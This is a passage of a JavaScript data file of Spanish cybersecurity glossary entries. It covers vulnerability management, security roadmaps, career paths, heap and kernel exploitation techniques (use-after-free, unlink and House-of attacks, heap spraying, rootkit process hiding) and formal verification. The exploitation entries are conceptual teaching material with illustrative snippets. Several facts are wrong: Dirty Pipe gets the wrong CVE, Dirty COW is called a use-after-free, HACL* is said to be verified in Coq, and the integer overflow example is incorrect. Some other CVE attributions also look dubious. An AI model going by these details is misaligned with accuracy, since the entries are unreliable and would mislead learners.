├─ ¿Otra instancia con vuln?\n   ├─ ¿Workaround no aplicado bien?\n└─ Reintente remediación\n```\n\n**5. Tracking & Reporting**\n```\nDashboard VRM:\n├─ Vulnerabilidades identificadas (mes)\n├─ Remediadas en SLA (target: >95%)\n├─ Delinquent (sin remediar después de SLA)\n├─ Mean Time To Remediate (MTTR) — target <30 días\n└─ Trending (vuln aumentando/disminuyendo?)\n\nReporte ejecutivo:\n├─ Critical count (debe ser cero)\n├─ Trends (mejor/peor)\n├─ Root causes (mal patching? old software?)\n└─ Recommendations (upgrade sunset software, invest automation)\n```\n\n**Desafíos:**\n⚠️ **Patch Fatigue** — Updates frecuentes, risk de downtime\n→ Solución: staged rollout (test → prod staggered)\n\n⚠️ **Incompatible patches** — Upgrade breaks aplicación\n→ Solución: virtual machines, sandboxing antes de prod\n\n⚠️ **Zero-days** — Sin parche disponible\n→ Solución: compensating controls (WAF, network segment, monitoring)\n\n⚠️ **Legacy software** — End-of-life, vendor no da parches\n→ Solución: aislamiento, network segmentation, frequent scans",
    examples: ["Heartbleed in production API: CVSS 7.5 × exposed → 24h fix → re-scanned, confirmed patched", "Legacy CMS: no patches → accept risk formally → move to containerized new app next sprint"],
    related: ["Patch management", "Risk prioritization", "VRM process"],
  },
  {
    id: 612,
    module: 58,
    term: "Estrategia de seguridad y roadmap",
    short: "Planificación multi-año: prioridades, budget, métricas de éxito.",
    detail: "**Estrategia = decisiones de largo plazo**\n\n**Ciclo anual de planificación:**\n```\nSeptiembre:\n├─ Security assessment (postura actual)\n├─ Threat landscape (qué ataques son trend)\n├─ Business objectives (company growth plans)\n└─ Identificar gaps\n\nOctubre:\n├─ Proponer iniciativas estratégicas\n├─ Estimar costos (personal, tools, training)\n├─ Priorizar (impacto vs esfuerzo)\n└─ Roadmap 3 años\n\nNoviembre:\n├─ Presentar a board/CFO\n├─ Negociar budget\n└─ Aprobar roadmap\n\nDiciembre onwards:\n└─ Ejecutar iniciativas en ciclos de 6-12 meses\n```\n\n**Ejemplo roadmap 3 años:**\n```\nAÑO 1: Foundation\n├─ Implementar SIEM (centralizar logs)\n├─ Deploy MFA (previene 99% credential attacks)\n├─ Crear incident response plan\n└─ ISO 27001 certification\n\nAÑO 2: Detection & Response\n├─ Deploy EDR (endpoints)\n├─ Implementar SOAR (automate response)\n├─ Threat hunting program\n└─ SOC operacional 24/7\n\nAÑO 3: Advanced\n├─ Deception technology (honeypots)\n├─ Purple team exercises (red vs blue)\n├─ ML-based anomaly detection\n└─ Certifications (OSCP para team)\n```\n\n**Métricas de éxito:**\n\n| Métrica | Baseline (Año 1) | Target (Año 3) | ROI |\n|---|---|---|---|\n| MTTR (incident response) | 8 horas | 1 hour | Reduce damages 87% |\n| Vulnerabilities remediados en SLA | 60% | 95% | Reduce exploits 50% |\n| Security awareness training compl. | 40% | 100% | Phishing risk -80% |\n| Mean Time To Patch (MTTP) | 45 días | 7 días | Patch gap window closes |\n| Incidents self-reported | 5% | 50% | Early detection |\n| Breach cost (if occurs) | $200/record | $50/record | Better containment |\n\n**Budget típico (% de IT budget):**\n- Small company (< 100 empls): 5-8%\n- Mid company (100-1000): 3-5%\n- Large company (>1000): 2-4%\n\nAllocación dentro de security budget:\n```\nPersonal:        50% (salarios CISO, analysts, engineers)\nTools:           30% (SIEM, EDR, firewall, compliance)\nTraining:        10% (certifications, conferences, simulations)\nIncidents/IR:     5% (forensics, legal, notificación)\nOther:            5% (travel, consultants, contingency)\n```\n\n**Cambios estratégicos en respuesta a:\n- Nuevas amenazas (APT campaign, ransomware family)\n- Nuevas regulaciones (leyes nuevas, compliance reqs)\n- Mergers & Acquisitions (integraciones de seguridad)\n- Board pressure (breach de competitor)\n\n**Comunicación con ejecutivos:**\n✓ Hablar en términos de RIESGO, no tecnología\n✓ Cuantificar impacto (\"sin SIEM: $1M promedio breach, con SIEM: $200K\")\n✓ Align con business goals (\"ROI: prevent 1 breach = $500K saved\")\n❌ \"Necesitamos EDR\" (sin contexto)\n✓ \"EDR reduce MTTR 80%, evita lateral movement en 95% casos\"",
    examples: ["3-year roadmap: MFA (Year 1) → SIEM (Year 2) → SOAR (Year 3) → 100x MTTR improvement", "Board pitch: $3M investment → 1 prevented breach per year → $15M ROI over 3 years"],
    related: ["Strategic planning", "Roadmapping", "Executive communication"],
  },
  {
    id: 613,
    module: 58,
    term: "Carrera en seguridad: roles y progresión",
    short: "Trayectorias: SOC analyst → manager, pentester → red team, architect.",
    detail: "**Roles en Seguridad:**\n\n**Blue Team (Defensa)**\n```\nCarrera path: IC (Individual Contributor) → Manager → Director\n\nSOC Analyst L1\n├─ Monitorea alerts de SIEM\n├─ Triage de false positives\n├─ Escala a L2 si crítico\n├─ Salario: $50-70K\n└─ Reqs: Security+ certificación, 6mo exp\n\nSOC Analyst L2\n├─ Investigación profunda de incidentes\n├─ Escribe reglas/queries SIEM\n├─ Mentorea L1\n├─ Salario: $70-90K\n└─ Reqs: 2-3 años, CySA+ o CISSP track\n\nIncident Handler / IR Specialist\n├─ Responde incidentes críticos\n├─ Forensica \n├─ Post-mortem analysis\n├─ Salario: $90-120K\n└─ Reqs: 3+ años, GCIH, ECIH\n\nSecurity Operations Manager\n├─ Gestiona equipo SOC (5-15 personas)\n├─ SLA management\n├─ Budget & hiring\n├─ Salario: $120-160K\n└─ Reqs: 5+ años, leadership skills\n\nSecurity Director\n├─ VP-level responsibility\n├─ Enterprise security strategy\n├─ Board reporting\n├─ Salario: $200-300K\n└─ Reqs: 10+ años, MBA often expected\n```\n\n**Red Team (Ofensiva)**\n```\nCarrera path: Security Analyst → Pentester → Red Team Lead\n\nPenetration Tester (Associate)\n├─ Pentests bajo supervisión\n├─ Reportes de hallazgos\n├─ Salario: $70-90K\n└─ Reqs: CEH o eJPT, OSCP desired\n\nPenetration Tester (Senior)\n├─ Lead pentests (scope, timeline)\n├─ Mentorea juniors\n├─ Specialization (web, API, mobile)\n├─ Salario: $100-130K\n└─ Reqs: OSCP, 3-5 años exp\n\nRed Team Operator\n├─ Simula APTs en ejercicios\n├─ C2 frameworks (Cobalt Strike, Sliver)\n├─ Evasión técnicas\n├─ Salario: $120-150K\n└─ Reqs: OSEP, 5+ años, muy especializado\n\nRed Team Lead\n├─ Diseña red team campaigns\n├─ Gestiona equipo\n├─ Salario: $150-200K\n└─ Reqs: 7+ años, strategic thinker\n```\n\n**Cloud/DevSecOps**\n```\nCloud Security Engineer\n├─ AWS/Azure/GCP security configs\n├─ IaC (Infrastructure as Code) scanning\n├─ Salario: $100-130K\n└─ Reqs: AWS Security Specialty, 2+ años\n\nApplication Security Engineer\n├─ Secure coding reviews\n├─ SAST/DAST integration en CI/CD\n├─ Salario: $100-140K\n└─ Reqs: Developer background, OWASP knowledge\n```\n\n**Security Architect**\n```\n├─ Diseña soluciones enterprise\n├─ Tecnología + estrategia\n├─ Salario: $150-200K\n└─ Reqs: 7+ años, diseño de sistemas, CISSP\n```\n\n**Cambios de carrera típicos:**\n```\nPath 1: Developer → AppSec\n├─ Leverage coding skills\n├─ OWASP knowledge\n└─ Blend of tech + security\n\nPath 2: Sysadmin → Security Engineer\n├─ Linux/Windows internals\n├─ Pivot to cloud/container security\n└─ Natural progression\n\nPath 3: Pentester → Red Teamer\n├─ Pentesting: external targets, time-boxed\n├─ Red teaming: long-term, APT simulation\n└─ Similar skills, different context\n\nPath 4: Analyst → Management\n├─ SOC L2/L3 → SOC Manager\n├─ People skills critical\n├─ Less hands-on technical\n└─ Higher pay but different satisfaction\n```\n\n**Skills que importan más que certs:**\n✓ Communication (explicar riesgos a no-tech)\n✓ Problem solving (pensar como attacker)\n✓ Continuous learning (campo evoluciona rápido)\n✓ Automation (escribir código/scripts)\n✓ Collaboration (trabajo en equipo)\n✓ Curiosidad (investigar, explorar)\n\n**Negociar salario:**\n- Research: Levels.fyi, Glassdoor, PayScale\n- Comparable roles en región\n- Years of experience\n- Certifications\n- Remote vs on-site\n- Stock options (startup)",
    examples: ["From L1 SOC ($55K) → L2 ($75K) → IR Spec ($105K) → Manager ($150K) over 8 years", "Pentester CyberSecurity → Red Team Operator (OSEP) → double salary in 3 years"],
    related: ["Career development", "Roles", "Skills"],
  },
  {
    id: 614,
    module: 58,
    term: "Conclusiones: Defensa práctica y evolución",
    short: "Resumen de conceptos, balance ataque-defensa, futuro de la ciberseguridad.",
    detail: "**Balance Ofensiva ↔ Defensiva**\n\n**Históricamente:**\n- 2000s: Defensas ganan (firewalls, antivirus mainstream)\n- 2010s: Ataque gana (APT sofisticadas, zero-days)\n- 2020s: Defensa resurgencia (EDR, SIEM, automation)\n- 2025+: Equilibrio (ambos lados usan IA/ML)\n\n**Realidad:**\n- Attacker: solo necesita 1 fallo\n- Defender: debe cubrir TODOS los puntos\n→ Defensa es más difícil\n\n**Aproximación práctica:**\n```\n❌ INCORRECTO: \"Vamos a ser 100% seguros\"\n✓ CORRECTO: \"Minimizamos riesgo a nivel aceptable\"\n\n❌ INCORRECTO: Esperar ningún ataque\n✓ CORRECTO: Prepararse para ataques, detectar rápido, responder mejor\n\n❌ INCORRECTO: Todas las medidas al mismo tiempo\n✓ CORRECTO: Priorizar (riesgo), fases (roadmap), medir (ROI)\n```\n\n**Futuro de la ciberseguridad (2025-2030):**\n\n**1. IA/ML en ambos lados**\n```\nDefensa:\n├─ Anomaly detection sin reglas (ML models)\n├─ Predictive threat intel (qué ataque next?)\n└─ Automated response (SOAR en esteroides)\n\nAtaque:\n├─ Phishing con deepfakes (audio, video fake)\n├─ Polymorphic malware (cambia cada ejecución)\n└─ Adversarial ML (evade detection models)\n\n→ Carrera armamentística continúa\n```\n\n**2. Quantum Computing**\n```\nAmenaza:\n├─ RSA/ECC encryption quebrada (10-20 años)\n├─ Retroactive decryption (todo lo cifrado hoy robado)\n└─ MFA biometrica vulnerable\n\nSolución:\n├─ Post-quantum cryptography (NIST standardizando 2024-2025)\n├─ Hybrid encryption (classical + quantum-resistant)\n└─ Key rotation strategy para lo cifrado hoy\n```\n\n**3. Supply Chain Security**\n```\n→ SolarWinds, Log4j, xz-utils → tendencia continúa\n→ Software Bill of Materials (SBOM) obligatorio\n→ Container scanning + code scanning mainstream\n```\n\n**4. Regulaciones más estrictas**\n```\n→ NIS2 (EU) hace CISO liable personalmente\n→ GDPR multas aumentadas\n→ Sector-specific (healthcare, financial) más regulation\n```\n\n**5. Security by Design (SecByDesign)**\n```\n→ \"Security = feature, not afterthought\"\n→ Architects incluyen seguridad en diseño\n→ Developers escriben código seguro (no pentesting fixes)\n→ DevSecOps = norma, no excepción\n```\n\n**Lo que no va a cambiar:**\n\n✓ **Human factor remains #1 vector**\n  ├─ Phishing efectiva 2025 como 2005\n  ├─ Social engineering timeless\n  └─ Training siempre necesario\n\n✓ **Fundamentals importan**\n  ├─ Authentication & Authorization\n  ├─ Least Privilege\n  ├─ Segmentación de red\n  ├─ Encryption\n  └─ Logging & Monitoring\n\n✓ **Threat intel integración**\n  ├─ Conocer el enemigo (MITRE ATT&CK)\n  ├─ Indicators of Compromise (IoCs)\n  └─ Sharing es norma (no competencia)\n\n**Consejo para tu carrera:**\n\n1. **Master fundamentals** — Redes, sistemas, crypto, diseño seguro\n2. **Specializa** — Cloud, API, mobile, hardware, kernel (domina algo bien)\n3. **Aprende a comunicar** — Explicar riesgos a no-técnicos crucial\n4. **Stay curious** — Campo evoluciona cada mes (blogs, Twitter, confs)\n5. **Hands-on siempre** — Build tools, practice exploits, lab home setup\n6. **Ética es base** — Hacking sin permiso es crimen (autorización siempre)\n7. **Contribute** — Open source, write-ups, teaching (comunidad crece)\n\n**Cierre:**\n\nCiberseguridad es campo de **batalla perpetua** entre ataque y defensa.\nTu rol es **preparate para guerra que nunca termina**.\nLa victoria no es eliminar amenazas (imposible),\nsinó **responder mejor y más rápido cada vez**.\n\n→ La defensa nunca perfecta, pero mejora cada día.\n→ Tu trabajo importa. Cada parche, cada alerta, cada training.\n\n**¡Bienvenido a la ciberseguridad!**",
    examples: ["ML detection: model catches 95% anomalies, 5% false positives (vs SIEM 80% with 20% FP)", "Post-quantum crypto: encrypt secret today with CRYSTALS-Kyber → safe from future quantum computers"],
    related: ["Future trends", "Career advice", "Fundamentals"],
  },
  ...
  // ── M59 · Heap Exploitation ─────────────────────────────────────────────────
  {
    id: 620,
    module: 59,
    term: "Heap y gestión de memoria",
    short: "Estructura del heap, allocators, fragmentación, vulnerabilidades.",
    detail: "**Heap vs Stack:**\n\n| | Stack | Heap |\n|---|---|---|\n| **Tamaño** | Fijo (típico 8MB) | Dinámico (GB) |\n| **Velocidad** | Rápido (pointer++) | Lento (allocator logic) |\n| **Datos** | Locales, parámetros | Dinámicos (malloc/new) |\n| **Limpieza** | Auto (out of scope) | Manual (free/delete) |\n| **Ordenamiento** | LIFO | Aleatorio |\n| **Vulnerabilidad** | Stack overflow | Heap overflow |\n\n**Heap allocators:**\n→ **ptmalloc** (glibc Linux) — default, uses bins + chunks\n→ **jemalloc** (Firefox, Node.js) — arena-based\n→ **Windows Heap** — lookaside lists, vulnerable a heap spraying\n\n**Chunk structure (ptmalloc):**\n```\n┌─────────────────────┐\n│  prev_size (8B)     │ ← metadata\n├─────────────────────┤\n│  size | flags (8B)  │ ← size + M(mmap) + P(prev_inuse) + A(non_main)\n├─────────────────────┤\n│  Forward pointer    │ ← linked list (si free)\n├─────────────────────┤\n│  Backward pointer   │ ← linked list (si free)\n├─────────────────────┤\n│                     │\n│  User data (N bytes)│ ← allocation\n│                     │\n├─────────────────────┤\n│  Next chunk header  │\n└─────────────────────┘\n```",
    examples: ["malloc(0x100) → allocator devuelve ~0x110 bytes (0x100 + 16B metadata)", "Free list corruption: overwrite FWD pointer → redirige a región controlada"],
    related: ["Memory management", "Allocators", "Chunk structure"],
  },
  {
    id: 621,
    module: 59,
    term: "Use-after-free (UAF)",
    short: "Acceder a memoria deallocada. Primitive para RCE.",
    detail: "**Scenario:**\n```c\nchar *buf = malloc(0x100);\nstrcpy(buf, \"data\");\nfree(buf);\nprintf(\"%s\", buf);  // ← Use-after-free (buf points to deallocated memory)\n```\n\n**Impacto:**\n→ **Lectura:** información disclosure (leak heap addresses)\n→ **Escritura:** heap corruption → controlar cómo se asigna memoria → RCE\n\n**Heap spray:**\n→ Predecir qué dirección tomará malloc después de free\n→ Preallocar N bloques para \"ocupar\" el heap\n→ Cuando se deallocate y reasigne, controlar contenido\n\n**Explotación típica:**\n1. UAF lectura → leak heap address\n2. Heap spray → ocupar espacio predicible\n3. UAF escritura → sobrescribir función pointer\n4. Invocar function pointer → RCE",
    examples: ["Firefox CVE-2021-43529: UAF en DOM parser → arbitrary code", "Chrome V8 UAF: object destructed pero referencia viva → type confusion → RCE"],
    related: ["Memory corruption", "Heap exploits", "Primitives"],
  },
  {
    id: 622,
    module: 59,
    term: "Buffer overflow en heap",
    short: "Escribir más bytes de lo permitido. Overflow a chunks adyacentes.",
    detail: "**Diferencia con stack overflow:**\n→ Stack: linear, fácil calcular offset\n→ Heap: fragmentado, dependente de allocator\n\n**Técnicas de explotación heap overflow:**\n\n**1. Metadata corruption:**\n```c\nmalloc(0x100)  // Chunk A (dirección: 0x12340000)\n← [A data area]\n← [A next_chunk_header]\nmalloc(0x100)  // Chunk B (dirección: 0x12340110)\n\n// Overflow en A sobrescribe B's metadata\nstrcpy(A.data, \"A\" × 0x120);  // 0x20 bytes extra\n→ B.size = controlado por attacker\n→ Next malloc interpreta tamaño falso → unlink attack\n```\n\n**2. Unlink attack:**\n```\nOverwrite chunk's FWD/BWD pointers\n→ Free → unlink → write primitivo\n→ Scriptable RCE vía GOT overwrite\n```\n\n**3. House of X exploits (ptmalloc specific):**\n→ House of Force: modificar top chunk size → allocate en GOT\n→ House of Spirit: fake chunk en stack → free → redirige heap allocation\n→ House of Orange: large bin attack → sobrescribir malloc hook",
    examples: ["Heap overflow: strcpy(buf, 0x1000 bytes) en 0x100 buffer → next chunk corrupted → arbitrary write", "CVE-2019-13639: Glibc malloc unlink attack → RCE via GOT overwrite"],
    related: ["Heap corruption", "Unlink", "Ptmalloc attacks"],
  },
  {
    id: 623,
    module: 59,
    term: "Heap spraying y predicción",
    short: "Ocupar heap con datos controlados para predecir ubicación.",
    detail: "**Heap spray:**\n→ Allocate miles de objetos con payload conocido\n→ Estadísticamente, uno estará en la dirección predicha\n→ Cuando vulnerability causa jump a esa dirección → RCE\n\n**Ejemplo clásico (Flash/browser):**\n```javascript\n// Crea vector de 10M objetos\nvar spray = [];\nfor (var i = 0; i < 0xA00000; i++) {\n  spray[i] = malloc(0x1000);  // Occupies heap\n  spray[i].data = \"shellcode\";  // Payload en conocida ubicación\n}\n\n// Vulnerability: jump a 0x12345678 (donde probablemente sea shellcode)\nvar result = vulnerable_function();\n```\n\n**Defensa:**\n→ **ASLR** (Address Space Layout Randomization): direcciones random c/ejecución\n→ **DEP/NX**: no ejecutar memoria heap\n→ **Heap randomization**: allocator randomiza offsets\n→ **CFI** (Control Flow Integrity): validar destinos antes de jump",
    examples: ["IE exploit CVE-2013-2365: heap spray + vuln → RCE", "Browser sandboxing: incluso si RCE en heap, escapes a browser sandbox requieren más vulns"],
    related: ["Heap layout", "Shellcode", "ASLR bypass"],
  },
  {
    id: 624,
    module: 59,
    term: "Defensa contra heap exploits",
    short: "Heap canaries, metadata encoding, shadow memory (ASAN).",
    detail: "**Heap protections en orden de efectividad:**\n\n**1. AddressSanitizer (ASAN)**\n→ Instrumento binary con runtime checks\n→ Shadow memory: 1/8 de dirección memoria trackea con bits\n→ Detecta: UAF, buffer overflow, memory leak\n→ Overhead: ~2x performance\n```bash\ngcc -fsanitize=address prog.c -o prog\n./prog  # ← Detecta y reporta memory errors\n```\n\n**2. Heap canaries (ptmalloc)**\n→ Valor aleatorio antes/después de chunk\n→ Free: verificar canary; si corrupted → abort\n→ Mitiga metadata corruption\n\n**3. Metadata encoding (glibc 2.32+)**\n→ Encoding FWD/BWD pointers con key\n→ Unlink: verificar encoding antes de usar\n\n**4. Safe linking (glibc 2.32+)**\n→ Pointers encryptados con key derivada de su dirección\n→ Leak de pointer ≠ dirección real\n\n**5. CFI (Control Flow Integrity)**\n→ Validar destino de jumps/calls\n→ Shadowing en enclaves seguros\n→ Más caro computacionalmente\n\n**En producción:**\n✗ No corres ASAN en prod (overhead)\n✓ Compilas con -D_GLIBCXX_ASSERTS + canaries\n✓ ASLR always on\n✓ Non-executable heap (NX bit)",
    examples: ["UAF detectada por ASAN: 'Use of deallocated memory' + stack trace", "Canary corruption detectada: malloc detects during free() → process aborted"],
    related: ["Mitigations", "Sanitizers", "CFI"],
  },
  ...
  // ── M60 · Kernel Exploitation ───────────────────────────────────────────────
  {
    id: 630,
    module: 60,
    term: "Kernel y privilegios",
    short: "Ring levels, syscalls, kernel address space, privilege escalation.",
    detail: "**Ring levels (x86):**\n\n| Ring | Nivel | Acceso | Ejecuta |\n|------|-------|--------|----------|\n| **0** | Kernel | Instrucciones privilegiadas | SO |\n| **1** | (unused) | — | — |\n| **2** | (unused) | — | — |\n| **3** | User | Instrucciones limitadas | Apps |\n\n**Qué solo ring 0 puede hacer:**\n→ Cambiar CR3 (page table)\n→ Deshabilitar SMEP/SMAP (protecciones)\n→ Acceder MSRs (Model Specific Registers)\n→ Loading GDT/IDT (descriptor tables)\n\n**Transición user → kernel:**\n```\nApp quiere archivo\n  ↓ syscall (int 0x80 / sysenter / syscall)\n  ↓ CPU switches ring 3 → ring 0\n  ↓ Kernel executa open()\n  ↓ sysret (ring 0 → ring 3)\n  ↓ App recibe file descriptor\n```\n\n**Kernel memory layout (Linux x86-64):**\n```\n0xffffffff80000000 ← Kernel mapped\n(...)        kernel code/data\n0xffffffff81000000 ← Kernel modules\n(...)        dynamic\n0xfffffffe00000000 ← Vmalloc area (dynamic allocations)\n(...)        \n0xffffffff00000000 ← Kernel high memory\n\n0x00007fffffffffff ← User space high\n(...)        libs, heap, stack\n0x0000000000400000 ← Code segment (ELF)\n```\n\n**Privilege escalation objetivo:**\n→ Exploit vulnerabilidad kernel → ring 0 code execution\n→ Cambiar UID/GID a 0 (root)\n→ Return a user space con capabilidades root",
    examples: ["Dirty COW (CVE-2016-5195): UAF en page cache → kernel space write → privesc", "Dirty Pipe (CVE-2022-1619): write to pipe buffers → kernel privesc"],
    related: ["Privilege escalation", "Ring levels", "Syscalls"],
  },
  {
    id: 631,
    module: 60,
    term: "Vulnerabilidades en drivers",
    short: "Kernel drivers: UAF, buffer overflow, race conditions en ring 0.",
    detail: "**Drivers kernel:**\n→ Código corriendo en ring 0\n→ Acceso directo a hardware (discos, red, USB)\n→ Si vulnerable → completo compromiso\n\n**Tipos de vulns en drivers:**\n\n**1. Buffer overflow:**\n```c\nioctl_handler(int cmd, char *user_buf) {\n  char kernel_buf[256];\n  copy_from_user(kernel_buf, user_buf, 0x1000);  // ← No valida tamaño\n  // kernel_buf overflow → smash stack/ret\n}\n```\n\n**2. Race conditions:**\n```c\nif (file->writable)  // Check\n  open(file);        // pero entre check y open, otro thread cambia permissions\n                     // TOCTOU (Time-Of-Check-Time-Of-Use)\n```\n\n**3. Use-after-free:**\n→ Device released pero driver continúa usando pointer\n\n**4. Integer overflow:**\n```c\nsize_t sz = 0x100000000 + 0x1;  // Overflow a 0x1\nmalloc(sz);  // Allocate 1 byte, escribe 0x100000001 bytes → kernel corruption\n```\n\n**Exploitación:**\n→ Leak kernel base (bypass KASLR)\n→ Overflow stack → modify ret → ROP to privesc function\n→ Cambiar cred structure → root",
    examples: ["Linux kernel CVE-2021-22555: netfilter vuln → trivial privesc", "Windows win32k.sys: multiple UAFs → kernel RCE"],
    related: ["Kernel vulns", "Privesc", "Driver exploitation"],
  },
  {
    id: 632,
    module: 60,
    term: "Rootkits y persistencia kernel",
    short: "Modificar kernel para ocultar procesos, backdoors persistentes.",
    detail: "**Rootkit = malware ejecutando ring 0:**\n→ Invisibilidad: hide procesos, archivos, conexiones\n→ Persistence: survives reboots\n→ Detección difícil (ring 0 puede mentir a ring 3)\n\n**Técnicas de ocultación:**\n\n**1. Process hiding:**\n```c\n// Modifica process list linking\nlist_del(&process->siblings);  // Saca del task_struct list\n// ps/procfs no lo ven, pero inode_t sigue existiendo\n```\n\n**2. File hiding:**\n→ Hook ls syscall → filtrar outputs\n→ Hook open syscall → bloquear acceso a /tmp/rootkit\n\n**3. Network hiding:**\n→ Hook netstat → ocultar conexiones a C2\n\n**4. Persistence:**\n→ Load kernel module en boot (modprobe.d/)\n→ Modificar initramfs/initrd\n→ Hook firmware updates para restaurar\n\n**Detección de rootkits:**\n⚠️ Difícil si rootkit ring 0:\n→ chkrootkit/rkhunter: detección signature (obsoleto)\n→ Hardware-based monitoring: Intel TXT, AMD SME\n→ Dual-boot + forensics desde otra OS (bypassa rootkit)\n→ Behavioral: detect anormalities (conexiones ocultas, CPU usage)",
    examples: ["Maxim rootkit (Windows): modifica kernel structures → hide malware", "Diamondfox botnet: kernel driver para disable antivirus + hide connections"],
    related: ["Persistence", "Stealth", "Kernel backdoors"],
  },
  {
    id: 633,
    module: 60,
    term: "SMEP, SMAP y protecciones kernel",
    short: "Mitigaciones de hardware/software contra kernel exploits.",
    detail: "**SMEP (Supervisor Mode Execution Protection, Intel):**\n→ Ring 0 no puede ejecutar código en user space\n→ Previene: kernel overflow → jump a shellcode en stack\n→ Bypass: ROP (gadgets en kernel text, válido para ring 0)\n\n**SMAP (Supervisor Mode Access Protection, Intel):**\n→ Ring 0 no puede acceder user space sin AC flag\n→ Previene: copy_from_user() exploits\n→ Bypass: stac/clac instrucciones (si attacker controla flags)\n\n**CFI (Control Flow Integrity):**\n→ Validar destinos de jumps/calls\n→ Tabla de targets válidos\n→ Shadow stack (separada de data stack)\n→ Mitiga: ROP, JOP chains\n\n**KPTI (Kernel Page Table Isolation, Linux):**\n→ User/kernel address spaces separados\n→ TLB flush en syscall (performance cost)\n→ Previene: Spectre/Meltdown speculative execution leaks\n\n**En la práctica:**\n✓ SMEP + SMAP combinados + CFI → exploit kernel mucho más difícil\n✗ Pero: kernel bugs siguen existiendo, bypass techniques evolucionan",
    examples: ["CVE-2021-22555: netfilter bug + SMEP/SMAP bypass vía userfaultfd", "SELinux + AppArmor: policy-based, no hardware, bypass posible pero detectado"],
    related: ["Mitigations", "Hardware security", "Kernel protections"],
  },
  {
    id: 634,
    module: 60,
    term: "Análisis de kernel crash dumps",
    short: "Dumpfiles para investigar crash. KD debugger, WinDbg analysis.",
    detail: "**Kernel panic / crash (oops en Linux, BSOD en Windows):**\n→ Kernel encontró condición fatal\n→ Queda dump de memoria, registers, stack\n\n**Análisis post-mortem:**\n\n**Linux (kdump):**\n```bash\ncat /proc/vmcore | strings > kernel_data.txt\n# O usar crash utility\ncrash /path/to/vmlinux /path/to/vmcore\ncrash> bt          # Backtrace\ncrash> dis 0xfff... # Disassemble\ncrash> rd 0xadr   # Read memory\n```\n\n**Windows (WinDbg):**\n```\nwindbg -I -z C:\\\\Windows\\\\Memory.dmp\n!analyze -v  # Automatic analysis\n!chkimg      # Checksum kernel image integrity\nkd> r         # Register dump\nkd> u eip     # Disassemble at crash point\n```\n\n**¿Qué revelan los dumps?**\n→ Vulnerable function que causó crash\n→ Stack frames → function call chain\n→ Registers → valores en el momento del crash\n→ Heap state → memory corruption indicators\n\n**Forense:**\n→ Compara dumps: misma vulnerabilidad vs exploit diferente\n→ Identifica: intentos de privesc (quien crasheó, por qué)\n→ Reproduce: recrear conditions en lab",
    examples: ["Windows BSOD: dump muestra UAF en win32k!SetWindowPos", "Linux kdump: reveal heap overflow in nf_conntrack"],
    related: ["Crash analysis", "Kernel debugging", "Forensics"],
  },

  // ── M61 · Formal Methods y Verificación ────────────────────────────────────
  {
    id: 640,
    module: 61,
    term: "Métodos formales en seguridad",
    short: "Usar matemática para probar que código es seguro.",
    detail: "**Qué es formal verification:**\n→ No testing (100% coverage imposible)\n→ Prueba matemática de que código cumple spec\n→ Garante: \"No hay overflow aquí\" (no \"es probable\")\n\n**Escala:**\n→ Pequeño módulo (criptografía): verificable en meses\n→ Microkernel (seL4): 10,000+ líneas código + 200,000 líneas prueba\n→ Full OS: impracticable hoy\n\n**Trade-off:**\n✓ Garantías matemáticas\n✓ Zero false negatives (si verifica, es correcto)\n✗ Muy costoso (humano-años)\n✗ Solo tan bueno como la especificación\n\n**Paradigmas:**\n→ **Model checking:** explore todos los estados (algoritmo exhaustivo)\n→ **Theorem proving:** construir prueba matemática (manual + asistente)\n→ **Abstract interpretation:** análisis estático con guarantías\n→ **Runtime monitoring:** verificar en ejecución (lite verification)",
    examples: ["seL4 microkernel: verificado completamente → certified secure", "Fiat-Crypto: criptografía verificada → Firefox usa en ciertas primitivas"],
    related: ["Verification", "Formal methods", "Correctness proofs"],
  },
  {
    id: 641,
    module: 61,
    term: "Model checking con TLA+",
    short: "Especificar sistema, verificar propiedades con herramienta automática.",
    detail: "**TLA+ (Temporal Logic of Actions):**\n→ Lenguaje para especificar sistemas concurrentes/distribuidos\n→ Model checker (TLC) verifica propiedades automáticamente\n→ Usado en: AWS, Microsoft, Google, JPMorgan\n\n**Ejemplo: Simple counter (sem race condition):**\n```tla\n─── MODULE Counter ───\nVARIABLE counter\n\nInit == counter = 0\n\nIncrement == counter' = counter + 1\nDecrement == counter' = counter - 1\n\nNext == Increment \\/ Decrement\n\nInvariant == counter >= 0  ← Property to verify\n\nSpec == Init /\\ [][Next]_counter ∧ WF_(counter)(Next)\n\nTHEOREM Spec => Invariant  ← TLC verifies this\n─────────────────────────────\n```\n\n**TLC checks:**\n→ Inicia en Init state\n→ Explora TODOS los possible next states\n→ Verifica Invariant en c/estado\n→ Si violeción encontrada → counterexample (traza de estados leading a error)\n\n**Ventajas sobre testing:**\n✓ Exhaustivo (todo espacio de estados)\n✓ Encuentra race conditions que testing missed\n✓ Contraejemplos explícitos\n\n**Limitaciones:**\n✗ State explosion (si muchas variables, espacio exponencial)\n✗ TLA+ spec puede tener bugs (garbage in, garbage out)\n✗ Verifica spec, no implementación real",
    examples: ["AWS: TLA+ para verificar distributed consensus algorithms antes de código", "Tendermint blockchain: TLA+ verified correctness del BFT protocol"],
    related: ["Model checking", "Verification", "TLA+"],
  },
  {
    id: 642,
    module: 61,
    term: "Theorem proving con Coq/Isabelle",
    short: "Demostración interactiva: describe propiedades, prueba step-by-step.",
    detail: "**Theorem proving (asistentes):**\n→ Interactive: user dirige la prueba\n→ Machine checks cada paso (garantía lógica)\n→ Usado en: criptografía, kernels, protocolos\n\n**Herramientas principales:**\n\n**Coq:**\n→ Lenguaje funcional + tactic language\n→ Proof asistant powerful\n\n**Ejemplo:**\n```coq\nLemma add_comm : forall n m : nat, n + m = m + n.\nProof.\n  intro n.\n  induction n as [| n IHn].\n  - reflexivity.  ← Base case: 0 + m = m + 0 holds by definition\n  - intros m.\n    simpl.  ← Simplify\n    rewrite IHn.  ← Apply induction hypothesis\n    reflexivity.  ← QED\nQed.\n```\n\n**Isabelle/HOL:**\n→ Basado en higher-order logic\n→ Usado en: VeriFast, seL4 kernel verification\n\n**Complejidad:**\n→ Simple property (commutativity): minutos\n→ Criptográfico correctness (AES): semanas\n→ Full microkernel (seL4): 200,000 líneas de prueba para 10,000 código\n\n**Beneficio:**\n✓ Prueba irrefutable (si checker es correcto)\n✓ Documentación ejecutable\n✗ Esfuerzo humano masivo\n✗ Requiere experto matemático",
    examples: ["HACL*: Biblioteca criptográfica verificada en Coq → compiled to C usada en Firefox", "seL4: microkernel con 39 security properties formally proven"],
    related: ["Proof assistants", "Formal proofs", "Coq/Isabelle"],
  },
  {
    id: 643,
    module: 61,
    term: "Symbolic execution y SMT solvers",
    short: "Ejecutar código simbólicamente, encontrar condiciones problematicas.",
